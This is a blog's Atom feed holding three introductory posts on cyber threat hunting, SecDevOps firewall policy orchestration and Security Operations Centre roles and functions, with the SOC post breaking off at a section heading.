<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-01-23T21:36:03+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Thebyteman</title><subtitle>One bit at a time to fill your byte of knowledge.</subtitle><author><name>Thebyteman</name></author><entry><title type="html">Cyber Threat Hunting</title><link href="http://localhost:4000/general/2022/01/23/Cyber-Threat-Hunting.html" rel="alternate" type="text/html" title="Cyber Threat Hunting" /><published>2022-01-23T00:00:00+05:30</published><updated>2022-01-23T00:00:00+05:30</updated><id>http://localhost:4000/general/2022/01/23/Cyber-Threat-Hunting</id><content type="html" xml:base="http://localhost:4000/general/2022/01/23/Cyber-Threat-Hunting.html">&lt;p&gt;Cyber Threat Hunting&lt;/p&gt;

&lt;p&gt;“Never expect machines to be ethical or strategic. Never expect humans to be good at searching large volumes of data at speed and scale or perform complex pattern matching”.&lt;/p&gt;

&lt;p&gt;Cyber threat hunting is a proactive security search of networks, endpoints, and datasets for malicious, suspicious, or risky actions that have eluded existing detection systems. As a result, there is a distinction to be made between cyber threat detection and cyber threat hunting. Threat detection is a more passive method of monitoring data and systems for potential security flaws, but it’s still necessary and can help a threat hunter. Proactive cyber threat hunting strategies have evolved to identify and categorise possible threats in advance of an attack by combining new threat intelligence with previously obtained data.&lt;/p&gt;

&lt;p&gt;Threat hunting can mean slightly different things to different organizations and analysts. Whatever interpretation is used, it’s vital to remember that threat hunting takes a lot of time because finding items of interest is much more difficult when signatures aren’t available. Furthermore, it is more important to ensure that enterprises and their analysts are constantly conducting threat hunting by ensuring they can detect and remediate any cyber hazards, rather than the semantics of the term.&lt;/p&gt;

&lt;p&gt;A 2019 Forrester Consulting study, commissioned on behalf of McAfee, revealed the top two endpoint security goals and initiatives of decision makers were to improve security detection capabilities (87%) and to increase efficiency in the SOC (75%). According to the study, gaps in EDR capabilities have created pain points for 83% of enterprises.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;Threat&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Hunting&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Techniques&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Supposition: Threat hunts begin with a hypothesis or assertion about the hunter’s perceptions of potential hazards in the environment and how to find them. The strategies, techniques, and processes (TTPs) of a suspected attacker can all be included in this Supposition. Threat hunters construct a logical path to detection using threat intelligence, environmental knowledge, and their own expertise and inventiveness.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Searching: This entails searching evidence data for specified artefacts using well stated search criteria, such as full packet data, flow records, logs, alerts, system events, digital pictures, and memory dumps. Because it’s rare to know exactly what to look for while searching for threats, it’s critical to strike a balance between not making search criteria too broad (i.e. becoming overwhelmed by too many results) and not making them too narrow (i.e. becoming overwhelmed by too few results) (i.e. missing out on threats by receiving too few results).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Clustering Data: Clustering is extracting groups of comparable data points based on specific characteristics from a larger data set using machine learning and AI technology. Analysts can use the technique to acquire a broader view of data that’s of interest, uncover commonalities and/or unrelated connections, then weave those insights together to get a fuller picture of what’s going on within their organization’s network and figure out what to do next.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Tuning artefacts: Taking numerous unique artefacts and determining when multiples of them appear together based on specified search criteria is known as grouping/Tuning.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Artefact Stacking: This approach is counting the number of occurrences for values of a specific type of data and examining the outliers. When data sets yield a finite number of results and inputs are appropriately designed, stacking is most effective. Finding abnormalities in huge data sets requires the ability to organise, filter, and edit the data in question, thus using technology — even something as simple as Excel — is crucial when stacking.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Intelligence, Trigger, and Investigation (ITI): An Intelligence strategy for gathering, storing, and processing data is required. SIEM (Security Information and Event Management) software can provide visibility and a history of activity in an organization’s IT environment. When sophisticated detection tools guide threat hunters to a specific system or area of a network, a hypothesis might act as a trigger to start an inquiry. Endpoint Detection and Response (EDR) technology, for example, can hunt, search and investigate deep into potentially dangerous abnormalities in a system or network, finally determining whether they are benign or malicious.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Remediation: To respond to, resolve, and mitigate threats, data obtained from confirmed malicious activity can be fed into automated security technology. Remove malware files, restore altered or deleted files to their original state, update firewall/IPS rules, install security patches, and change system configurations – all while learning more about what happened and how to strengthen your protection against such assaults in the future.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;Optimizing&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Cyber&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Threat&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Hunting&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The Most feasible optimization of time, resource and investigation is done when Human expertise and Machine expertise Team-up to get to a conclusion. Humans assist in reaching a resolution faster and with greater accuracy, as well as removing redundant and routine manual errors that can be riddled with mistakes.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;Key&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Threat&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Hunting&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Take&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aways&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;•	Proactive: Rather than waiting for an alert from an existing security tool, threat hunting requires proactively sniffing out potential intruders before any alerts are generated.&lt;/p&gt;

&lt;p&gt;•	Trusting your Gut: The best threat hunters avoid relying too heavily on alerts coming from automated security technologies. Instead, they look for clues and listen to their gut, and eventually apply those findings to create automated threat detection rules.&lt;/p&gt;

&lt;p&gt;•	Tracking Traces: The Whole Idea of Threat Hunting revolves around  believing that an organization’s environment has been compromised and that attackers have left traces. It is therefore critical to follow all traces and clues to the end, no matter how long or winding the hunt may be.&lt;/p&gt;

&lt;p&gt;•	Embracing Creativity: Hunting for threats isn’t about sticking to the rules. Threat hunting necessitates embracing imagination as well as any appropriate approaches in order to keep ahead of the most talented and imaginative adversaries.&lt;/p&gt;

&lt;p&gt;However, it is also clear based on these characteristics that many organizations find it difficult to establish a well-skilled threat hunting team.&lt;/p&gt;

&lt;p&gt;Instead, it becomes a work of art that only one or two individuals are capable of and even they require enormous investment of time.&lt;/p&gt;

&lt;p&gt;This lack of repeatability stems from a lack of support for this process. Even the most proficient threat hunters struggle to consistently produce valuable results.&lt;/p&gt;</content><author><name>Thebyteman</name></author><category term="general" /><summary type="html">Cyber Threat Hunting “Never expect machines to be ethical or strategic. Never expect humans to be good at searching large volumes of data at speed and scale or perform complex pattern matching”. Cyber threat hunting is a proactive security search of networks, endpoints, and datasets for malicious, suspicious, or risky actions that have eluded existing detection systems. As a result, there is a distinction to be made between cyber threat detection and cyber threat hunting. Threat detection is a more passive method of monitoring data and systems for potential security flaws, but it’s still necessary and can help a threat hunter. Proactive cyber threat hunting strategies have evolved to identify and categorise possible threats in advance of an attack by combining new threat intelligence with previously obtained data. Threat hunting can mean slightly different things to different organizations and analysts. Whatever interpretation is used, it’s vital to remember that threat hunting takes a lot of time because finding items of interest is much more difficult when signatures aren’t available. Furthermore, it is more important to ensure that enterprises and their analysts are constantly conducting threat hunting by ensuring they can detect and remediate any cyber hazards, rather than the semantics of the term. A 2019 Forrester Consulting study, commissioned on behalf of McAfee, revealed the top two endpoint security goals and initiatives of decision makers were to improve security detection capabilities (87%) and to increase efficiency in the SOC (75%). According to the study, gaps in EDR capabilities have created pain points for 83% of enterprises. Threat Hunting Techniques: Supposition: Threat hunts begin with a hypothesis or assertion about the hunter’s perceptions of potential hazards in the environment and how to find them. The strategies, techniques, and processes (TTPs) of a suspected attacker can all be included in this Supposition. Threat hunters construct a logical path to detection using threat intelligence, environmental knowledge, and their own expertise and inventiveness. Searching: This entails searching evidence data for specified artefacts using well stated search criteria, such as full packet data, flow records, logs, alerts, system events, digital pictures, and memory dumps. Because it’s rare to know exactly what to look for while searching for threats, it’s critical to strike a balance between not making search criteria too broad (i.e. becoming overwhelmed by too many results) and not making them too narrow (i.e. becoming overwhelmed by too few results) (i.e. missing out on threats by receiving too few results). Clustering Data: Clustering is extracting groups of comparable data points based on specific characteristics from a larger data set using machine learning and AI technology. Analysts can use the technique to acquire a broader view of data that’s of interest, uncover commonalities and/or unrelated connections, then weave those insights together to get a fuller picture of what’s going on within their organization’s network and figure out what to do next. Tuning artefacts: Taking numerous unique artefacts and determining when multiples of them appear together based on specified search criteria is known as grouping/Tuning. Artefact Stacking: This approach is counting the number of occurrences for values of a specific type of data and examining the outliers. When data sets yield a finite number of results and inputs are appropriately designed, stacking is most effective. Finding abnormalities in huge data sets requires the ability to organise, filter, and edit the data in question, thus using technology — even something as simple as Excel — is crucial when stacking. Intelligence, Trigger, and Investigation (ITI): An Intelligence strategy for gathering, storing, and processing data is required. SIEM (Security Information and Event Management) software can provide visibility and a history of activity in an organization’s IT environment. When sophisticated detection tools guide threat hunters to a specific system or area of a network, a hypothesis might act as a trigger to start an inquiry. Endpoint Detection and Response (EDR) technology, for example, can hunt, search and investigate deep into potentially dangerous abnormalities in a system or network, finally determining whether they are benign or malicious. Remediation: To respond to, resolve, and mitigate threats, data obtained from confirmed malicious activity can be fed into automated security technology. Remove malware files, restore altered or deleted files to their original state, update firewall/IPS rules, install security patches, and change system configurations – all while learning more about what happened and how to strengthen your protection against such assaults in the future. Optimizing Cyber Threat Hunting: The Most feasible optimization of time, resource and investigation is done when Human expertise and Machine expertise Team-up to get to a conclusion. Humans assist in reaching a resolution faster and with greater accuracy, as well as removing redundant and routine manual errors that can be riddled with mistakes. Key Threat Hunting Take-aways: • Proactive: Rather than waiting for an alert from an existing security tool, threat hunting requires proactively sniffing out potential intruders before any alerts are generated. • Trusting your Gut: The best threat hunters avoid relying too heavily on alerts coming from automated security technologies. Instead, they look for clues and listen to their gut, and eventually apply those findings to create automated threat detection rules. • Tracking Traces: The Whole Idea of Threat Hunting revolves around believing that an organization’s environment has been compromised and that attackers have left traces. It is therefore critical to follow all traces and clues to the end, no matter how long or winding the hunt may be. • Embracing Creativity: Hunting for threats isn’t about sticking to the rules. Threat hunting necessitates embracing imagination as well as any appropriate approaches in order to keep ahead of the most talented and imaginative adversaries. However, it is also clear based on these characteristics that many organizations find it difficult to establish a well-skilled threat hunting team. Instead, it becomes a work of art that only one or two individuals are capable of and even they require enormous investment of time. This lack of repeatability stems from a lack of support for this process. Even the most proficient threat hunters struggle to consistently produce valuable results.</summary></entry><entry><title type="html">SecDevOps - FPO</title><link href="http://localhost:4000/general/2022/01/23/SecDevOps-FPO.html" rel="alternate" type="text/html" title="SecDevOps - FPO" /><published>2022-01-23T00:00:00+05:30</published><updated>2022-01-23T00:00:00+05:30</updated><id>http://localhost:4000/general/2022/01/23/SecDevOps-FPO</id><content type="html" xml:base="http://localhost:4000/general/2022/01/23/SecDevOps-FPO.html">&lt;p&gt;SecDevOps - Firewall Policy Orchestration&lt;/p&gt;

&lt;p&gt;Firewall automation projects are seemingly all the rage these days, with everyone looking to automate at least some portion of the process. Usually, the goal is to save time and money by automating firewall administration and policy management. However, these two categories have grown exponentially in scope and complexity in recent years, so automation projects often become much larger and time-consuming than originally intended and produce varied results.  In some less-than-stellar cases, they even collapse all together, and people revert to the original manual processes they were seeking to automate.&lt;/p&gt;

&lt;p&gt;How can this situation be avoided? By taking a systematic and achievable approach to firewall automation using a combination of SecOps and DevOps.&lt;/p&gt;

&lt;p&gt;Security Policy Orchestration is intelligent network change automation. It goes beyond simple task automation by truly understanding the network through simulation and analytics. It also gives security people an extra level of governance and control, which is so critical to assure security and business continuity.&lt;/p&gt;

&lt;p&gt;DevOps has been a popular topic in IT circles over the past few years. DevOps is a software development method that aligns application development with IT operations. To fulfil on the vision of DevOps, IT has had to adopt a number of new tools and technologies. Some examples of these new tools are automation tools, containerization and orchestration platforms.&lt;/p&gt;

&lt;p&gt;The DevOps process is radically different than legacy processes, so it makes sense that IT departments would need new technologies to support this shift.
What about security, though? How has that changed? The fact is that security has lagged behind when it comes to enabling the transition to DevOps.&lt;/p&gt;

&lt;p&gt;With traditional IT, development and deployment times can be long, and the security team has the time to harden security at the end of the development cycle. With DevOps, getting visibility into the possible security gaps before an application is launched is more complicated because there isn’t the time to take weeks or months to ensure the security is hardened.&lt;/p&gt;

&lt;p&gt;Automation is one of the cornerstones of DevOps, so it stands to reason that security also needs to be automated. Just when you thought DevOps was the new black, along comes SecDevOps.&lt;/p&gt;

&lt;p&gt;Now let’s discuss security automation and use a firewall change process as an example.&lt;/p&gt;

&lt;p&gt;One important attribute of SecDevOps is heavy use of security automation. A simple act of changing a firewall has huge potential for security automation.  The SecDevOps firewall change process goes beyond changing a few lines in a config, but also provides an independent and automated verification process that most organizations don’t perform today.
Corporate firewall management is increasingly complex due to an expanding network perimeter and the proliferation of cloud computing services. Gaps in effective firewall management delay business initiatives and lead to increasing security and compliance challenges.
Consider what happens when a firewall policy is changed.  First the policy change request is reviewed and approved.  Then the policy change request is assigned and acted upon.  Many times, but not always, the change is verified by another person through configuration review.&lt;/p&gt;

&lt;p&gt;Security automation takes this process one step further.  Imagine when a firewall is changed that a security audit event is automatically logged.  Next, an automation component notices the firewall change and automatically spins up a remote scanning instance in a cloud provider.  Next, that scanning instance is contacted using APIs to perform a remote network scan.  The scan completes, results are exported and compared with prior scan results automatically.&lt;/p&gt;

&lt;p&gt;Finally, the automation component automatically updates the firewall change request in a ticketing system showing the scan results.  We have now completed an automatic, independent and autonomous firewall change verification.   That simplified yet powerful workflow is security automation and completes what many people refer to as a closed loop.&lt;/p&gt;

&lt;p&gt;The collective impact of these developments on network and security operations tasks is having a profound impact on people, processes and technology, including DevOps groups, who like their Security Operations (SecOps) brethren, are under pressure to roll out services faster.
Being able to automatically generate, provision and synchronize Security Policy changes across a growing set of systems – with security, compliance and governance concerns accounted for – means that security will not become a bottleneck that slows down DevOps teams.&lt;/p&gt;

&lt;p&gt;Contrary to popular belief, Security Policy Orchestration wasn’t created to restrict a company but to free it and help DevOps teams to accomplish its vision at the lowest IT risk level possible.  After all, there is no such thing as bulletproof security where the Internet is concerned. Instead, security folks will focus on reducing risk, which puts us in a much better position to add value to the business.  Plus,  since so many of today’s biggest threats (i.e. APTs, for example) are network-based, introducing the tenets of Security Policy Orchestration  – which literally automates best security practices into change processes – is in the mutual best interest of both SecOps and DevOps teams.&lt;/p&gt;

&lt;p&gt;One of the value propositions of using an orchestration solution is the time savings. By using a high level of automation to request, design and implement a change, the whole process can be reduced from a week or more to just a day or two.&lt;/p&gt;

&lt;p&gt;Security policy orchestration is indicative of the maturity of the security policy management market, as well as the increasing complexity of network environments due to virtualization, cloud and IPv6. It’s no longer feasible for a network team to try to manage everything without a high level of automation,&lt;/p&gt;</content><author><name>Thebyteman</name></author><category term="general" /><summary type="html">SecDevOps - Firewall Policy Orchestration Firewall automation projects are seemingly all the rage these days, with everyone looking to automate at least some portion of the process. Usually, the goal is to save time and money by automating firewall administration and policy management. However, these two categories have grown exponentially in scope and complexity in recent years, so automation projects often become much larger and time-consuming than originally intended and produce varied results. In some less-than-stellar cases, they even collapse all together, and people revert to the original manual processes they were seeking to automate. How can this situation be avoided? By taking a systematic and achievable approach to firewall automation using a combination of SecOps and DevOps. Security Policy Orchestration is intelligent network change automation. It goes beyond simple task automation by truly understanding the network through simulation and analytics. It also gives security people an extra level of governance and control, which is so critical to assure security and business continuity. DevOps has been a popular topic in IT circles over the past few years. DevOps is a software development method that aligns application development with IT operations. To fulfil on the vision of DevOps, IT has had to adopt a number of new tools and technologies. Some examples of these new tools are automation tools, containerization and orchestration platforms. The DevOps process is radically different than legacy processes, so it makes sense that IT departments would need new technologies to support this shift. What about security, though? How has that changed? The fact is that security has lagged behind when it comes to enabling the transition to DevOps. With traditional IT, development and deployment times can be long, and the security team has the time to harden security at the end of the development cycle. With DevOps, getting visibility into the possible security gaps before an application is launched is more complicated because there isn’t the time to take weeks or months to ensure the security is hardened. Automation is one of the cornerstones of DevOps, so it stands to reason that security also needs to be automated. Just when you thought DevOps was the new black, along comes SecDevOps. Now let’s discuss security automation and use a firewall change process as an example. One important attribute of SecDevOps is heavy use of security automation. A simple act of changing a firewall has huge potential for security automation. The SecDevOps firewall change process goes beyond changing a few lines in a config, but also provides an independent and automated verification process that most organizations don’t perform today. Corporate firewall management is increasingly complex due to an expanding network perimeter and the proliferation of cloud computing services. Gaps in effective firewall management delay business initiatives and lead to increasing security and compliance challenges. Consider what happens when a firewall policy is changed. First the policy change request is reviewed and approved. Then the policy change request is assigned and acted upon. Many times, but not always, the change is verified by another person through configuration review. Security automation takes this process one step further. Imagine when a firewall is changed that a security audit event is automatically logged. Next, an automation component notices the firewall change and automatically spins up a remote scanning instance in a cloud provider. Next, that scanning instance is contacted using APIs to perform a remote network scan. The scan completes, results are exported and compared with prior scan results automatically. Finally, the automation component automatically updates the firewall change request in a ticketing system showing the scan results. We have now completed an automatic, independent and autonomous firewall change verification. That simplified yet powerful workflow is security automation and completes what many people refer to as a closed loop. The collective impact of these developments on network and security operations tasks is having a profound impact on people, processes and technology, including DevOps groups, who like their Security Operations (SecOps) brethren, are under pressure to roll out services faster. Being able to automatically generate, provision and synchronize Security Policy changes across a growing set of systems – with security, compliance and governance concerns accounted for – means that security will not become a bottleneck that slows down DevOps teams. Contrary to popular belief, Security Policy Orchestration wasn’t created to restrict a company but to free it and help DevOps teams to accomplish its vision at the lowest IT risk level possible. After all, there is no such thing as bulletproof security where the Internet is concerned. Instead, security folks will focus on reducing risk, which puts us in a much better position to add value to the business. Plus, since so many of today’s biggest threats (i.e. APTs, for example) are network-based, introducing the tenets of Security Policy Orchestration – which literally automates best security practices into change processes – is in the mutual best interest of both SecOps and DevOps teams. One of the value propositions of using an orchestration solution is the time savings. By using a high level of automation to request, design and implement a change, the whole process can be reduced from a week or more to just a day or two. Security policy orchestration is indicative of the maturity of the security policy management market, as well as the increasing complexity of network environments due to virtualization, cloud and IPv6. It’s no longer feasible for a network team to try to manage everything without a high level of automation,</summary></entry><entry><title type="html">Security Operations Centre</title><link href="http://localhost:4000/general/2022/01/23/What-is-a-SOC.html" rel="alternate" type="text/html" title="Security Operations Centre" /><published>2022-01-23T00:00:00+05:30</published><updated>2022-01-23T00:00:00+05:30</updated><id>http://localhost:4000/general/2022/01/23/What-is-a-SOC</id><content type="html" xml:base="http://localhost:4000/general/2022/01/23/What-is-a-SOC.html">&lt;p&gt;Security Operations Centre&lt;/p&gt;

&lt;p&gt;Security Operation is the continuous operational practice for maintaining and managing a secure IT environment through the Implementation and execution of certain services and process. Its main purpose is to detect, prevent, prioritize and respond to security incidents.&lt;/p&gt;

&lt;p&gt;Security Operation Consists of various security operation tasks, like:
•	Security Monitoring
•	Security Incident Management
•	Vulnerability Management
•	Security Device Management
•	Network flow Monitoring&lt;/p&gt;

&lt;p&gt;SOC is a centralized unit and a single point of view through which an organization’s assets are monitored, assessed, and defended from the threats. It also facilitates situational awareness and real-time alerting if any intrusion or attack is detected. It functions as a hub or central command post, collecting telemetry from across an organization’s IT infrastructure, including networks, devices, appliances, and data stores, regardless of where those assets are located. The proliferation of advanced threats involves gathering context from a variety of sources. Essentially, the SOC serves as a point of contact for all events logged within the organisation that are being monitored. The SOC must determine how each of these events will be managed and dealt with.&lt;/p&gt;

&lt;p&gt;Traditionally, SOCs have been built on a hub-and-spoke architecture, with a security information and event management (SIEM) system aggregating and correlating data from security feeds. Vulnerability assessment solutions, governance, risk, and compliance (GRC) systems, application and database scanners, intrusion prevention systems (IPS), user and entity behaviour analytics (UEBA), endpoint detection and remediation (EDR), and threat intelligence platforms (TIP) are all examples of spokes in this model .&lt;/p&gt;

&lt;p&gt;The SOC is typically led by a SOC manager and may include incident responders, SOC Analysts (levels 1, 2, and 3), threat hunters, and an incident response manager (s).The SOC reports to the CISO, who in turn reports to either the CIO or directly to the CEO.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;Roles&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;SOC&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Department&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Both the security technologies (e.g., software) and the individuals who make up the SOC team provide the “framework” for your security operations.&lt;/p&gt;

&lt;p&gt;Members of the SOC Team Include:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Manager: The group’s leader can fill any function while also monitoring the security systems and processes.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Analysts: They compile and analyse data from a specific time period (for example, the preceding quarter) or after a data breach.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Investigator: After a breach, the investigator works closely with the responder to figure out what happened and why (typically, one individual serves as both investigator and responder).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Responder: Responding to a security breach entails a number of responsibilities. During a crisis, someone who is familiar with these requirements is essential.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Auditor: All current and future legislation includes compliance requirements. This position keeps track of these standards and ensures that your company meets them.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Note: Depending on the size of an organization, one person may perform multiple roles listed. In some cases, it may come down to one or two people for the entire “team.”&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;SOC&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;capabilities&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Situational Awareness and operational intelligence - SOC provides information about what is going on across the different parts of IT infrastructure. It also provides Operational intelligence about IT infrastructure.&lt;/p&gt;

&lt;p&gt;Threat control and prevention - Using Internal and external resources, it provides the knowledge of IOC’S (Indicator of compromise) of attacks. This enables SOC to provide Threat control and prevention.
Forensics - SOC analysts use structured log data to conduct investigation and understand the root cause of the attack and restrict the attacker’s ability to perform an attack against the organization.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;functions&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;performed&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;by&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;SOC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;1.Take Stock of Available Resources&lt;/p&gt;

&lt;p&gt;The SOC is in charge of two types of assets: the various devices, processes, and applications they are tasked with protecting, as well as the defensive tools at their disposal to assist in this protection.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;What The SOC Protects: The SOC cannot protect devices and data that are not visible to them. There are likely to be blind spots in the network security posture that can be discovered and exploited if visibility and control from device to cloud are not provided. As a result, the SOC’s goal is to obtain a comprehensive picture of the business’ threat landscape, which includes not only the various types of endpoints, servers, and software on premises, but also third-party services and traffic flowing between these assets.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;How The SOC Protects: The SOC should also have a thorough understanding of all cybersecurity tools available as well as all SOC workflows. This improves agility and enables the SOC to operate at maximum efficiency.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;2.Preparation and Preventative Maintenance&lt;/p&gt;

&lt;p&gt;Even the most well-equipped and agile response processes are ineffective when it comes to preventing problems from occurring in the first place. The SOC implements preventative measures, which can be divided into two categories, to help keep attackers at bay.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Preparation: Members of the team should stay up to date on the latest security advances, cybercrime trends, and the emergence of new dangers on the horizon. This study can be used to develop a security roadmap that will guide the company’s cybersecurity activities in the future, as well as a disaster recovery plan that will provide ready guidance in the event of a worst-case scenario.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Preventative Maintenance: All activities done to make successful attacks more difficult, such as regularly maintaining and updating existing systems, updating firewall policies, patching vulnerabilities, and whitelisting, blacklisting, and securing apps, are included in this phase.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;3.Continuous Proactive Monitoring&lt;/p&gt;

&lt;p&gt;The SOC’s tools scan the network 24 hours a day, seven days a week, looking for any anomalies or suspicious activity. The SOC can be warned of developing risks promptly by monitoring the network around the clock, providing them the best chance to avoid or mitigate harm. A SIEM or an EDR are examples of monitoring technologies. The most advanced of these can employ behavioural analysis to “teach” systems the difference between normal day-to-day operations and genuine threat behaviour, reducing the amount of triage and analysis required by people.&lt;/p&gt;

&lt;p&gt;4.Alert Ranking and Management&lt;/p&gt;

&lt;p&gt;When monitoring tools send out alerts, it’s up to the SOC to examine each one carefully, delete any false positives, and decide how aggressive any actual threats are and what they might be targeting. This enables them to effectively prioritise emerging threats, addressing the most pressing concerns first.&lt;/p&gt;

&lt;p&gt;5.Threat Response&lt;/p&gt;

&lt;p&gt;When most people think of the SOC, they think of these acts. The SOC responds as a first response as soon as an incident is confirmed, shutting down or isolating endpoints, stopping malicious programmes (or blocking them from executing), deleting files, and so on. The goal is to respond to the extent required while minimising the impact on company continuity.&lt;/p&gt;

&lt;p&gt;6.Recovery and Remediation&lt;/p&gt;

&lt;p&gt;Following an incident, the SOC will try to restore systems and recover any data that has been lost or compromised. Wiping and restarting endpoints, restructuring systems, or, in the case of ransomware attacks, establishing valid backups are all possible ways to avoid the malware. This step, if completed successfully, will restore the network to its pre-incident state.&lt;/p&gt;

&lt;p&gt;7.Log Management&lt;/p&gt;

&lt;p&gt;The SOC is in charge of gathering, maintaining, and reviewing all network activity and communications logs for the whole enterprise. This information helps create a baseline for “normal” network activity, can show the presence of risks, and can be utilised for post-incident remediation and forensics. Many SOCs employ a SIEM to collect and correlate data from applications, firewalls, operating systems, and endpoints, all of which generate their own logs.&lt;/p&gt;

&lt;p&gt;8.Root Cause Analysis (RCA)&lt;/p&gt;

&lt;p&gt;Following an incident, the SOC is in charge of determining exactly what happened, when, how, and why. During this inquiry, the SOC will use log data and other information to trace the problem back to its source and create an RCA Report, which will aid in the prevention of future problems.&lt;/p&gt;

&lt;p&gt;9.Security Refinement and Improvement&lt;/p&gt;

&lt;p&gt;Cybercriminals are continually improving their TTPs (Tools, Techniques and Procedures) and the SOC must keep up with them by implementing upgrades on a regular basis. The strategies established in the Security Road Map are brought to life in this step, but it can also involve hands-on techniques like red-teaming and purple-teaming.&lt;/p&gt;

&lt;p&gt;10.Compliance Management&lt;/p&gt;

&lt;p&gt;Many of the SOC’s processes are guided by best practises, but others are driven by regulatory obligations. The SOC is in charge of auditing their systems on a regular basis to ensure compliance with any requirements imposed by their company, industry, or regulating authorities. GDPR, HIPAA, and PCI DSS are examples of these regulations. Acting in line with these regulations not only protects the sensitive data entrusted to the firm, but it also protects the company from reputational harm and legal problems that may arise as a result of a breach.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;Optimization&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;SOC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

